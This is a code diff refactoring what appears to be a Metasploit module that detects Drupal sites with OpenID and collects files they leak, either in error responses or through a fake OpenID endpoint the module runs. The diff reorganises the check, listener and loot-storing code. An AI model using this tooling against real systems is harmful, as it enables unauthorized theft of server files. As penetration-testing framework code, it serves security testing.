@@ -71,6 +71,31 @@ EOF
     return xrds
   end
 
+  def check
+    signature = Rex::Text.rand_text_alpha(5 + rand(5))
+    res = send_openid_auth(signature)
+
+    unless res
+      return Exploit::CheckCode::Unknown
+    end
+
+    if drupal_with_openid?(res, signature)
+      return Exploit::CheckCode::Detected
+    end
+
+    if generated_with_drupal?(res)
+      return Exploit::CheckCode::Safe
+    end
+
+    return Exploit::CheckCode::Unknown
+  end
+
+  def run
+    @prefix = Rex::Text.rand_text_alpha(4 + rand(4))
+    @suffix = Rex::Text.rand_text_alpha(4 + rand(4))
+    exploit
+  end
+
   def primer
     res = send_openid_auth(get_uri)
 
@@ -89,64 +114,24 @@ EOF
     # Check if file was retrieved on the drupal answer
     # Better results, because there isn't URL encoding,
     # plus probably allows to retrieve longer files.
-    unless error_loot.blank?
-      print_status("#{peer} - File found on the Drupal answer")
-      store(error_loot)
-      service.stop
-      return
+    print_status("#{peer} - Searching loot on the Drupal answer...")
+    unless loot?(error_loot)
+      # Check if file was leaked to the fake OpenID endpoint
+      # Contents are probably URL encoded, plus probably long
+      # files aren't full, but something is something :-)
+      print_status("#{peer} - Searching loot on HTTP query...")
+      loot?(@http_loot)
     end
 
-    # Check if file was leaked to the fake OpenID endpoint
-    # Contents are probably URL encoded, plus probably long
-    # files aren't full, but something is something :-)
-    unless @loot.blank?
-      print_status("#{peer} - File contents leaked through the OpenID request")
-      store(@loot)
-      service.stop
-      return
-    end
-
-    # Nothing :( just stop the service
-    # so the auxiliary module stops
+    # stop the service so the auxiliary module ends
     service.stop
   end
 
-  def check
-    signature = Rex::Text.rand_text_alpha(5 + rand(5))
-    res = send_openid_auth(signature)
-
-    unless res
-      return Exploit::CheckCode::Unknown
-    end
-
-    if res.code == 200 and res.body =~ /openid_identifier.*#{signature}/
-      return Exploit::CheckCode::Detected
-    end
-
-    if generated_with_drupal?(res)
-      return Exploit::CheckCode::Safe
-    end
-
-    return Exploit::CheckCode::Unknown
-  end
-
-  def generated_with_drupal?(http_response)
-    return false if http_response.blank?
-    return true if http_response.headers['X-Generator'] and http_response.headers['X-Generator'] =~ /Drupal/
-    return true if http_response.body and http_response.body.to_s =~ /meta.*Generator.*Drupal/
-    return false
-  end
-
-  def run
-    @prefix = Rex::Text.rand_text_alpha(4 + rand(4))
-    @suffix = Rex::Text.rand_text_alpha(4 + rand(4))
-    exploit
-  end
 
   def on_request_uri(cli, request)
     if request.uri =~ /#{@prefix}/
       vprint_status("Signature found, parsing file...")
-      @loot = parse_loot(request.uri)
+      @http_loot = parse_loot(request.uri)
       return
     end
 
@@ -194,6 +179,27 @@ EOF
 
     return nil
   end
+
+  def loot?(data)
+    return false if data.blank?
+    store(data)
+    return true
+  end
+
+  def drupal_with_openid?(http_response, signature)
+    return false if http_response.blank?
+    return false unless http_response.code == 200
+    return false unless http_response.body =~ /openid_identifier.*#{signature}/
+    return true
+  end
+
+  def generated_with_drupal?(http_response)
+    return false if http_response.blank?
+    return true if http_response.headers['X-Generator'] and http_response.headers['X-Generator'] =~ /Drupal/
+    return true if http_response.body and http_response.body.to_s =~ /meta.*Generator.*Drupal/
+    return false
+  end
+
 
 end
 
